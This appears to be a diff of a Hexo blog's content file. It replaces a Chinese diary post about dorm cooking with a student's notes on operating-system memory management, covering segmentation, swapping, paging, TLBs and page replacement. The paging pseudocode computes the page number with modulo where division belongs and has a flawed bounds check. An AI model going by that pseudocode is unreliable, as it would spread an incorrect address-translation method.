+<li>申请域名并绑定</li>
+<li>发布第一篇博客</li>
+</ol>
+<h3 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h3><p>现在只是把房子搭起来还没有装修啥啊，让俺接着去学一学~</p>
+<p>[x] 更换 Hexo 主题</p>
+<p>[x] 熟悉博客的发布修改标签等功能</p>
+<p>[ ] 建立图床</p>
+<p>[ ] 增加其他的小插件 ~~</p>
+<h3 id="分类设置"><a href="#分类设置" class="headerlink" title="分类设置"></a>分类设置</h3><ul>
+<li>学习笔记    | 系统性的学习<ul>
+<li>专业课<ul>
+<li>操作系统</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>技术小记    | 碎片化知识</li>
+<li>生活随笔<ul>
+<li>山与水    | 游记</li>
+<li>书与影    | 书评影评</li>
+<li>时与光    | 定期总结</li>
+</ul>
+</li>
+<li></li>
+</ul>
+]]></content>
       <categories>
-        <category>时与光</category>
+        <category>技术小记</category>
       </categories>
       <tags>
-        <tag>小结</tag>
-        <tag>周记</tag>
+        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
-    <title>时与光W-202007-4</title>
-    <url>/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-4/</url>
-    <content><![CDATA[<p>2020年7月20日~7月26日</p>
-<p>宿舍小厨</p>
+    <title>操作系统之内存管理</title>
+    <url>/2020/06/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<p>本章将会涉及到</p>
+<ol>
+<li>基本内存管理</li>
+<li>Segmentation    分段 </li>
+<li>Swap    交换</li>
+<li>⭐Virtual   虚拟内存</li>
+<li>其他需要考虑的问题</li>
+</ol>
 <a id="more"></a>
-<h2 id="宿舍小厨"><a href="#宿舍小厨" class="headerlink" title="宿舍小厨"></a>宿舍小厨</h2><p>上周买的食材陆陆续续到了, 即将开始与导员宿管的躲猫猫生活. 由于我手残下单鸡蛋的时候多下了一份,现在我对着80个鸡蛋欲哭无泪… </p>
-<p>整理下目前的装备与食材.</p>
+<h2 id="基本内存管理"><a href="#基本内存管理" class="headerlink" title="基本内存管理"></a>基本内存管理</h2><p>本节会涉及到:</p>
 <ol>
-<li>锅*2, 一个口深适合煮汤, 一个口浅适合煎东西;</li>
-<li>一个蒸蛋器</li>
-<li>面板, 擀面杖, 刀具餐具</li>
+<li>储存层次</li>
+<li>CPU利用率</li>
+<li>重定位<ol>
+<li>Base &amp; Limit</li>
+<li>什么时候重定位</li>
 </ol>
-<p>食材:</p>
+</li>
+</ol>
+<h3 id="储存层次"><a href="#储存层次" class="headerlink" title="储存层次"></a>储存层次</h3><p>参看计组部分, 不是重点, 略</p>
+<h3 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h3><p>如果考虑到内存的存在, CPU的利用率还将会进一步降低.  如果CPU中同时存在 $n$ 个运行中的程序 (称为多道程序的度 degree) ,则 CPU利用率为</p>
+<script type="math/tex; mode=display">
+1-P^n</script><p>其中 $P$ 是IO等待时间的占比</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124321.jpg" alt="1591668423275"></p>
+<blockquote>
+<ul>
+<li>These  sizes allow 4 programs to be in memory at once. With an 80% average I/O wait, we have a CPU utilization of 1-0.8^4≈60%. </li>
+<li>Adding another 16MB of memory allow 8 programs, thus raising the CPU utilization to 83%. </li>
+<li>Adding yet another 16MB of memory allow 12 programs, only increase CPU utilization to 93%. </li>
+<li>…97% </li>
+</ul>
+</blockquote>
+<p>下图展示了实际CPU中的资源分配</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124332.jpg" alt="1591668467874"></p>
+<ul>
+<li>0-10秒内 仅Job1 在工作. CPU利用率为 $1-0.8^1=0.2$ 相当于执行了 $10\times0.2=2 min$</li>
+<li>10-15秒内 Job1/2 在工作. CPU利用率为 $1-0.8^2=0.36$ 平均每个任务相当于执行了 $5\times\frac{1}{2}\times0.36=0.9 min$</li>
+<li>15-20 秒内 Job1/2/3 在工作. CPU利用率为 $1-0.8^3=0.49$ 平均每个任务相当于执行了 $5\times\frac{1}{3}\times0.49=0.8 min$</li>
+<li>……</li>
+</ul>
+<h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>程序本身包含的数据是从零开始<del>的异世界生活</del> 而在实际运行中, 几乎不可能物理地址恰好从零开始, 因此需要将程序中的逻辑地址(也叫相对地址) 转换成物理地址. 这在CPU中是由 MMU (内存控制单元) 完成的.</p>
+<h4 id="基址与限址-Base-amp-Limit"><a href="#基址与限址-Base-amp-Limit" class="headerlink" title="基址与限址   Base &amp; Limit"></a>基址与限址   Base &amp; Limit</h4><p>Base &amp; Limit 都是作为寄存器储存在PCB中, 每个进程都有一个. </p>
+<p>Base 是逻辑地址0 在物理地址空间中的地址(的指针) , 也就是该进程在内存空间中开始的地方. </p>
+<p>Limit 是进程所拥有的最大地址<strong>数目</strong>, Base + Limit 是 进程的最大地址</p>
+<blockquote>
+<p>​    eg Base = 10000   Limit = 4000  ➡ 最大地址为 14000</p>
+</blockquote>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124344.jpg" alt="重定位图"></p>
+<p>如图, 逻辑地址先与limit比较, 无误后再加上base成为物理地址</p>
+<h4 id="MMU"><a href="#MMU" class="headerlink" title="MMU"></a>MMU</h4><p>Memory Management Unit , 内存管理空间, 作用是将虚拟内存转化为实际的物理地址, 再将其送往数据Bus上.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124432.jpg" alt="mmu"></p>
+<h4 id="什么时候发生重定位"><a href="#什么时候发生重定位" class="headerlink" title="什么时候发生重定位?"></a>什么时候发生重定位?</h4><p>一般来说有三种:</p>
 <ol>
-<li>鸡蛋</li>
-<li>紫薯</li>
-<li>黑小麦全麦粉</li>
-<li>鸡肉肠, 鸡胸肉,金枪鱼肉罐头</li>
-<li>燕麦麦片</li>
-<li>荞麦面</li>
-<li>全麦面包</li>
+<li>编译时, 这种就要求编译之后的程序代码的地址必须是实际运行中的地址, 常用于直接烧录的嵌入式等.</li>
+<li>载入时, 要求载入后程序在内存中的位置必定不变, 无法进行灵活地管理与切换</li>
+<li>运行时, 支持交换 分页等操作</li>
 </ol>
-<h3 id="鸡蛋羹"><a href="#鸡蛋羹" class="headerlink" title="鸡蛋羹"></a>鸡蛋羹</h3><p>试图使用蒸蛋器蒸出鸡蛋羹, 但是挺失败的, 尽管在网上找了很多食谱…</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">鸡蛋羹做法</span><br><span class="line"></span><br><span class="line">少水蛋(质地硬)</span><br><span class="line">1. ⭐蛋:水&#x3D;1:1.5</span><br><span class="line">2. ⭐小火&gt;&gt;大火</span><br><span class="line">3. 温水&gt;凉水</span><br><span class="line">4. 电解质&gt;水        #电解质:盐&#x2F;高汤</span><br><span class="line">5. 加盖&gt;无盖        #用布反向包裹锅盖</span><br><span class="line">6. ⭐时间刚好&gt;&gt;多蒸一会</span><br><span class="line">7. ⭐凉开水&gt;&gt;自来水</span><br><span class="line"></span><br><span class="line">多水蛋(质地软)</span><br><span class="line">1. 蛋:水&#x3D;1:2 or 1:3</span><br><span class="line">2. 一定要加电解质</span><br><span class="line">3. 火候,时间相对不重要</span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line">1. 蒸锅上汽之后再放入</span><br><span class="line">总结自B站UP喃猫小厨房,BV1x441117r4</span><br></pre></td></tr></table></figure>
-<p>但是总是蒸出来蜂窝蛋…</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%B8%A1%E8%9B%8B%E7%BE%B9.jpg" alt=""></p>
-<h3 id="煎鸡蛋"><a href="#煎鸡蛋" class="headerlink" title="煎鸡蛋"></a>煎鸡蛋</h3><p>从最开始打在锅里面热一热, 到后面在少放油的情况下尽量更香, 味道好极了现在.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E8%9B%8B.jpg" alt=""></p>
-<h3 id="什锦-燕麦-紫薯-鸡蛋-牛奶饼"><a href="#什锦-燕麦-紫薯-鸡蛋-牛奶饼" class="headerlink" title="什锦-燕麦-紫薯-鸡蛋-牛奶饼"></a>什锦-燕麦-紫薯-鸡蛋-牛奶饼</h3><p>总而言是是各种奇妙的搭配组合…</p>
-<h4 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h4><p>两个鸡蛋不加水搅拌,加入全麦粉, 加入烤熟切块的紫薯, 放入锅中烤熟.<br>但是我总觉得这么厚的饼不太适合直接烤, 不容易烤熟…而且紫薯块太大, 翻面的时候总是支离破碎.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%B4%AB%E8%96%AF%E9%A5%BC.jpg" alt=""></p>
-<h4 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h4><p>第一次失败后决定做薄饼. 鸡蛋+麦片, 第一锅完全成了炒鸡蛋, 后续陆续放入面粉, 最终成形. 燕麦片本身的厚度使饼没有想象中那么薄, 但相比上一版好多了.</p>
-<p>味道其实不太行, 由于只加入了少许盐, 基本没有任何滋味, 食之无味.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E9%A5%BC0.5.jpg" alt=""></p>
-<h4 id="尝试3"><a href="#尝试3" class="headerlink" title="尝试3"></a>尝试3</h4><p>将燕麦片牛奶泡一晚, 次日打入鸡蛋搅拌, 放油下锅. 煎出来了奇形怪状的小饼干(疑似), 依旧没什么味道.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E9%A5%BC.jpg" alt=""></p>
-<h4 id="尝试4"><a href="#尝试4" class="headerlink" title="尝试4"></a>尝试4</h4><p>直接鸡蛋液打匀分次倒入铺满锅底即可. 本来想加入切丁的鸡肉肠, 但是鸡蛋饼太薄肉丁根本镶嵌不上去, 最后变成了鸡蛋饼+炒肉丁.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%B8%A1%E8%9B%8B%E9%A5%BC%E8%82%89%E4%B8%81.jpg" alt=""></p>
-<h3 id="紫薯燕麦粥"><a href="#紫薯燕麦粥" class="headerlink" title="紫薯燕麦粥"></a>紫薯燕麦粥</h3><p>紫薯蒸熟切块, 加水熬制30min,加入麦片熬煮20min, 香浓的燕麦紫薯粥就做好了.</p>
-<p>粥越煮越稠, 我中间还以为自己水加多了去了点, 结果最后快熬干了orz.</p>
-<p>水量没过紫薯上表面1-2公分.</p>
-<p>味道还可以, 口中直呼烫烫烫</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%B2%A5.jpg" alt=""></p>
-<h4 id="荞麦面-煎鸡蛋-炒金枪鱼肉"><a href="#荞麦面-煎鸡蛋-炒金枪鱼肉" class="headerlink" title="荞麦面+煎鸡蛋+炒金枪鱼肉"></a>荞麦面+煎鸡蛋+炒金枪鱼肉</h4><p>好吧这个没啥技术含量..看图吧</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%9D%A2.jpg" alt=""></p>
-<h3 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h3><p>千里之行始于足下, 疫情期间也是看着其他人都化身大厨. 一直想开始却迟迟没有动身. 在学校尝试着开始自己做菜做饭才发现其实没有想象中那么困难, 没有锅碗瓢盆就想办法解决, 没有食材就京东天猫冷链, 缺少绿叶菜就多买水果补充维生素. 天下是有难易乎? 为之, 则难者亦易也.</p>
-<p>还有就是对任何事情都不能等闲视之, 哪怕是简单的鸡蛋羹, 小学三年级在家里面拿微波炉轻松搞定的东西换了厨具做的依旧很糟糕. 煎鸡蛋放多少油? 做饼的面水比例是多少才不粘锅有能均匀铺开? 听到什么声音说明是火候太过了? 好多细节都是没有实操的情况下光靠别人的转述学不到的. 就像这几天在学校招新群里讨论的家长, 自己其实根本不了解行业情况, 道听途说地从别人的谈论, 亲戚朋友的个例中断定专业的优劣. 纸上得来终觉浅,绝知此事要躬行啊.</p>
-<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/ai.png" alt=""></p>
-<h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><p>跟着宗主任去招新群里面答疑打白工, 每天都能碰见各种神奇的家长, 常面一度十分欢乐</p>
-<h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3><p>完全搞定数电+计组</p>
-<p>检查牙齿</p>
-<p>购买装备&amp;爬山</p>
+<hr>
+<h2 id="Segmentation-分段"><a href="#Segmentation-分段" class="headerlink" title="Segmentation 分段"></a>Segmentation 分段</h2><p>在上述讨论中, 我们是把程序的所有东西整体放入内存中. 而事实上, 程序的数据包括代码段(Code), 数据段(Data), 堆栈段(Stack),….</p>
+<p>可能出现的问题: 修改Data数据时误改了Code段; 批处理时可以复用代码段等.</p>
+<p>所以采用分段.每一段的逻辑地址都从0 开始, 每一段都拥有自己的Base 与 Limit , 这些映射关系储存在段表中.</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609082725.jpg" alt="分段"></p>
+<h3 id="GDT-amp-LDT"><a href="#GDT-amp-LDT" class="headerlink" title="GDT &amp; LDT"></a>GDT &amp; LDT</h3><p>每个进程拥有自己的LDT (Local Descriptor Table) 用于储存进程中每个段的Base等数据.</p>
+<p>OS 拥有一个GDT (Global  Descriptor Table) </p>
+<p>存疑 GDT时用来干什么的?</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125624.jpg" alt=""></p>
+<h3 id="段的大小"><a href="#段的大小" class="headerlink" title="段的大小"></a>段的大小</h3><p>一般 Inter 16K段, 每段拥有1 billion 32-bit words</p>
+<h3 id="分段与换页的比较"><a href="#分段与换页的比较" class="headerlink" title="分段与换页的比较"></a>分段与换页的比较</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125600.jpg" alt="比较"></p>
+<hr>
+<h2 id="Swap-交换"><a href="#Swap-交换" class="headerlink" title="Swap 交换"></a>Swap 交换</h2><p>本小节涉及到:</p>
+<ol>
+<li>交换的概念</li>
+<li>碎片/空洞</li>
+<li>⭐内存管理机制<ol>
+<li>位图    bit map    </li>
+<li>链表    list</li>
+</ol>
+</li>
+<li>⭐内存的分配机制</li>
+</ol>
+<p>先前说到内存空间的大小远远不够支撑所有进程同时使用. 因此Swap 出现了, 基本思想是谁用, 内存资源给谁. 当另外一个进程需要CPU资源时, 将原先的进程撤出, 换入目标进程.</p>
+<p>内存分区的可以分成固定大小, 缺点是会造成空间的浪费, 并且无法运行大于分区大小的程序. </p>
+<p>分区大小也可以是可变的, 但是随着时间会有碎片(空洞, Holes) 的产生</p>
+<h3 id="Holes-空洞"><a href="#Holes-空洞" class="headerlink" title="Holes 空洞"></a>Holes 空洞</h3><p>空洞的产生</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124358.jpg" alt=""></p>
+<p>空洞还是难以清除的. 内存是处在高速变化中的, 试图将碎片合并为更大的内存空间片式必须要将目前的进程停滞. 对外表现为长达数十秒甚至分钟的机器假死, 是不可被忍受的.</p>
+<h3 id="内存的管理机制"><a href="#内存的管理机制" class="headerlink" title="内存的管理机制"></a>内存的管理机制</h3><p>将内存划分为更加精细的等大片段, 并记录其是否处于使用中, 如下图</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124410.jpg" alt="内存管理"></p>
+<h4 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h4><p>如图B, 1表示使用中, 0表示未使用.</p>
+<p>pro: 便于管理, 修改只需要取非操作即可</p>
+<p>con: 难于查找, 每次必须查找n位连续的0; 实际位图很大</p>
+<h4 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h4><p>如图C, P表示process, H表示holes, 第二位表示开始位, 第三位表示长度.</p>
+<p>pro: 便于查找, 只需要比较长度, 节约管理成本.</p>
+<p>con: 难于管理, 归还内存时要合并空洞, 合并内存时要分裂空洞</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609124419.jpg" alt="合并空洞"></p>
+<h3 id="内存的分配机制"><a href="#内存的分配机制" class="headerlink" title="内存的分配机制"></a>内存的分配机制</h3><h4 id="First-fit"><a href="#First-fit" class="headerlink" title="First fit"></a>First fit</h4><p>从0开始找到第一个合适的</p>
+<h4 id="Next-fit"><a href="#Next-fit" class="headerlink" title="Next fit"></a>Next fit</h4><p>从上一次查找结束的地方开始找到第一个合适的</p>
+<h4 id="Best-fit"><a href="#Best-fit" class="headerlink" title="Best fit"></a>Best fit</h4><p>在所有空洞中找<strong>最略大于</strong>所需内存的空洞</p>
+<h4 id="Worst-fit"><a href="#Worst-fit" class="headerlink" title="Worst fit"></a>Worst fit</h4><p>在所有空洞中找<strong>最大于</strong>所需内存的空洞</p>
+<h4 id="Quick-fit"><a href="#Quick-fit" class="headerlink" title="Quick fit"></a>Quick fit</h4><p>随机查找空洞, 只要够用就安排</p>
+<ul>
+<li><p>Fist , Next , Quick 方式 , 只要找到能用的即可, 不考虑空洞体量是否与所需要的符合.</p>
+</li>
+<li><p>Best 问题:</p>
+<ul>
+<li>碎片产生的太多且小</li>
+<li>查找过程太慢</li>
+</ul>
+</li>
+<li><p>Worst 问题</p>
+<ul>
+<li>迅速消耗大空洞</li>
+<li>查找过程太慢</li>
+</ul>
+</li>
+<li><p>实际性能最好的是 Quick fit</p>
+<p><del>这就是无招胜有招吗 👴就是风清扬, i了i了</del></p>
+</li>
+</ul>
+<h2 id="Virtual-Memory-虚拟内存"><a href="#Virtual-Memory-虚拟内存" class="headerlink" title="Virtual Memory 虚拟内存"></a>Virtual Memory 虚拟内存</h2><p>本节包括:</p>
+<ol>
+<li>分页</li>
+<li>多级页表<ol>
+<li>页表每项对应大小</li>
+<li>页表包括的内容</li>
+</ol>
+</li>
+<li>TLB 快表</li>
+<li><del>反转页表</del></li>
+</ol>
+<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>先前都是按照最大需要的内存来划分空间的. 实际上很多时候是用不到这些空间的. 因此我们在把每个进程(或者段)拆分, 当前使用中的部分在内存中, 其他部分放在磁盘中. </p>
+<p>将进程(或段) 的虚拟空间地址分成一定大小的<strong>页(Page)</strong> , 称为分页.</p>
+<p>将进程(或段) 的物理空间地址分成一定大小的<strong>页帧(Frame)</strong> </p>
+<p>当进程发现所需要的数据所在的页不在内存, 而在磁盘中时, 会发生<strong>页面失效(Page Fault)</strong> , 并通过页面调度将内存中某一页调出, 调入目标页. </p>
+<h4 id="分页过程"><a href="#分页过程" class="headerlink" title="分页过程"></a>分页过程</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125322.jpg" alt="分页"></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页算法  伪代码</span></span><br><span class="line">address ad_lo 	<span class="comment">//逻辑地址,已知</span></span><br><span class="line">address ad_phy	<span class="comment">//物理地址,待求</span></span><br><span class="line">address* Base	<span class="comment">//已知</span></span><br><span class="line">size	 Limit	<span class="comment">//已知</span></span><br><span class="line">size 	page_size	<span class="comment">//每一页的大小, 一般与页帧大小相同,已知</span></span><br><span class="line">pageTable table[]	<span class="comment">//页表,已知</span></span><br><span class="line"><span class="keyword">int</span> pageNo		<span class="comment">//页号,未知</span></span><br><span class="line"><span class="keyword">int</span> frameNo		<span class="comment">//页帧号,未知</span></span><br><span class="line"></span><br><span class="line">getAd_Phy()&#123;</span><br><span class="line">	<span class="keyword">if</span> (ad_lo &gt; *(Base + Limit) )</span><br><span class="line">		<span class="keyword">throw</span> error(<span class="string">"地址越界!"</span>)</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		pageNo = ad_lo % page_size	<span class="comment">//页号</span></span><br><span class="line">		offset = ad_lo - pageNo * page_size		<span class="comment">//页内偏移量</span></span><br><span class="line">		frameNo = table[PageNo]		<span class="comment">//页帧号</span></span><br><span class="line">		<span class="keyword">if</span> (frameNo == null)</span><br><span class="line">			<span class="keyword">throw</span> error(<span class="string">"页面失效!"</span>)</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			ad_phy = frameNo * page_size + offset</span><br><span class="line">			<span class="keyword">return</span> ad_phy</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/img_1173.png" alt="练习"></p>
+<h4 id="分页场景"><a href="#分页场景" class="headerlink" title="分页场景"></a>分页场景</h4><ol>
+<li><p>进程创建时</p>
+<ul>
+<li><p>确定程序体量</p>
+</li>
+<li><p>创建进程表</p>
+</li>
+</ul>
+</li>
+<li><p>程序执行时</p>
+<ul>
+<li><p>MMU刷新</p>
+</li>
+<li><p>TLB刷新</p>
+</li>
+</ul>
+</li>
+<li><p>页面失效时</p>
+<ul>
+<li>判断失效页面, 确定调入页面</li>
+<li>确定并调出调出页面</li>
+<li>调入调入页面</li>
+</ul>
+</li>
+<li><p>程序结束</p>
+<ul>
+<li>释放资源</li>
+</ul>
+</li>
+</ol>
+<h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>实际上页表很大($2^{32}$), 但是我们要求它快!</p>
+<ol>
+<li><p>将页表放在硬件(寄存器)中</p>
+<p>……用脚趾头想都不现实</p>
+<p><del>万一哪天科技突飞猛进了后人看到这篇博客会是什么想法呢</del></p>
+</li>
+<li><p>页表放在软件(内存)中</p>
+<p>效率低</p>
+</li>
+</ol>
+<p>多级列表,字面意思,  应该很好懂.</p>
+<p><strong>每项的大小</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PT1</th>
+<th>PT2</th>
+<th>Offset</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>10 $bits$</td>
+<td>10  $bits$</td>
+<td>12  $bits$</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>那么总虚拟地址空间大小为 $2^{10+10+12} = 4G$ ,一级页表中每项对应的实际上是 $2^{10+12} = 4M$ 地址空间, 二级页表实际上是$2^{12} = 4K$</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125441.jpg" alt="页面大小"></p>
+<p><strong>实际上页表还包括</strong></p>
+<ol>
+<li>Page frame number 页帧号</li>
+<li>Present /absent  若为1 ,表示该页对应物理地址在内存中</li>
+<li>Protection  标识访问权限, R/W/X</li>
+<li>Modified    标识是否修改过, 若1, 调出时需要写入磁盘</li>
+<li>Referenced  最近是否被访问, 用于页面调度算法的参考</li>
+<li>Caching disabled   不懂</li>
+</ol>
+<h3 id="TLB-快表"><a href="#TLB-快表" class="headerlink" title="TLB 快表"></a>TLB 快表</h3><p>根据二八原则, 20% 的页面被访问80%次, 将它们记录在硬件上, 直查物理地址</p>
+<p>剩下的80%再跑去页表查</p>
+<p>这一块硬件称为 <strong>转换检测缓冲区  (Translation Lookaside Buffers, TLB, 又称快表)</strong></p>
+<p>TLB包括的内容与页表大致相同, 但是更快!</p>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125452.jpg" alt="内容"></p>
+<h3 id="反转页表"><a href="#反转页表" class="headerlink" title="反转页表"></a>反转页表</h3><p>没听, 好像是从页帧转页, 但是不重要</p>
+<h2 id="页面调度算法"><a href="#页面调度算法" class="headerlink" title="页面调度算法"></a>页面调度算法</h2><p>本节包括</p>
+<ol>
+<li>最优PRA</li>
+<li>NRU  最近未使用</li>
+<li>FIFO  </li>
+<li>SC  第二机会</li>
+<li>Clock PRA</li>
+<li>LRU<ol>
+<li>硬件实现</li>
+<li>软件实现</li>
+</ol>
+</li>
+<li>Working Set</li>
+<li>WSClock </li>
+</ol>
+<p>因为很重要所以单独拉出来一点讲了</p>
+<ul>
+<li><p>刚才提到页面失效,  并随后进行页面调度. 调入的页面是明确的, 但是把什么调出呢? 这就是页面调度算法<strong>(Page Replacement Algorithms ,PRA)</strong></p>
+</li>
+<li><p>除了页面失效外在别的地方也有使用 例如</p>
+<ul>
+<li>缓存</li>
+<li>搜索引擎的热点</li>
+</ul>
+</li>
+</ul>
+<h3 id="最优PRA"><a href="#最优PRA" class="headerlink" title="最优PRA"></a>最优PRA</h3><p>每次都将未来最远不会用到的调走</p>
+<p><del>废话但是我怎么知道啷个是未来不会用到的啊</del></p>
+<p>所以这个算法没有实际意义, 用于评价其他算法的性能</p>
+<h3 id="Not-Recently-Used-NRU-最近未使用"><a href="#Not-Recently-Used-NRU-最近未使用" class="headerlink" title="Not Recently Used (NRU, 最近未使用)"></a>Not Recently Used (NRU, 最近未使用)</h3><p>每个页码都有 Reference bit, Modified bit  (是否被访问, 修改位)</p>
+<p>按照以下顺序调出:</p>
+<ol>
+<li>not referenced, not modified </li>
+<li>not referenced, modified</li>
+<li>referenced, not modified </li>
+<li>referenced, modified</li>
+</ol>
+<h3 id="FIFO-PRA"><a href="#FIFO-PRA" class="headerlink" title="FIFO PRA"></a>FIFO PRA</h3><p>先进先出</p>
+<p>con: 经常将访问过, 修改过的位调出</p>
+<p>下面是它的改进</p>
+<h3 id="Second-Chance-PRA"><a href="#Second-Chance-PRA" class="headerlink" title="Second Chance PRA"></a>Second Chance PRA</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;SC PRA</span><br><span class="line">while(页面到队头)&#123;</span><br><span class="line">	if(referenceBit &#x3D;&#x3D; 0)</span><br><span class="line">		调出;</span><br><span class="line">	else &#123;</span><br><span class="line">		referenceBit &#x3D; 0;</span><br><span class="line">		页面出队;</span><br><span class="line">		页面入队; 	&#x2F;&#x2F;就是扔回队尾了</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="The-Clock-PRA"><a href="#The-Clock-PRA" class="headerlink" title="The Clock  PRA"></a>The Clock  PRA</h3><p>原理相同, 只是改成循环, 改变指针来仿造队列移动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(指针到本页了)&#123;</span><br><span class="line">	if(referenceBit &#x3D;&#x3D; 0)</span><br><span class="line">		调出;</span><br><span class="line">	else &#123;</span><br><span class="line">		referenceBit &#x3D; 0;</span><br><span class="line">		指针后移;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125508.jpg" alt="clock"></p>
+<h3 id="Least-Recently-Used-LRU-最近最少使用"><a href="#Least-Recently-Used-LRU-最近最少使用" class="headerlink" title="Least Recently Used (LRU, 最近最少使用)"></a>Least Recently Used (LRU, 最近最少使用)</h3><p>是NRU的升级版, 根据<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E5%B1%80%E9%83%A8%E6%80%A7%E5%8E%9F%E7%90%86/15572003?fr=aladdin" target="_blank" rel="noopener">程序局部性原理</a>, 最近被使用的往往将会再次被使用.</p>
+<p>实现方式:</p>
+<ol>
+<li>建立一个最近使用页面的集合</li>
+<li>在每个条目中保留计数器, 每次选择最低的(最少), 定期清零(最近)</li>
+</ol>
+<p><strong>模拟LRU</strong></p>
+<h4 id="硬件模拟"><a href="#硬件模拟" class="headerlink" title="硬件模拟"></a>硬件模拟</h4><ul>
+<li><p>当访问 n 时, 第 n 列置0 , 第 n 行其他位置1</p>
+</li>
+<li><p>当需要调出时, 调出每行和最少的, 如果相同, 调出….</p>
+</li>
+</ul>
+<p>存疑: 不应该是调出离自己最远的吗.? 向下数的第一个?</p>
+<p><strong>缺点</strong></p>
+<p>开销大</p>
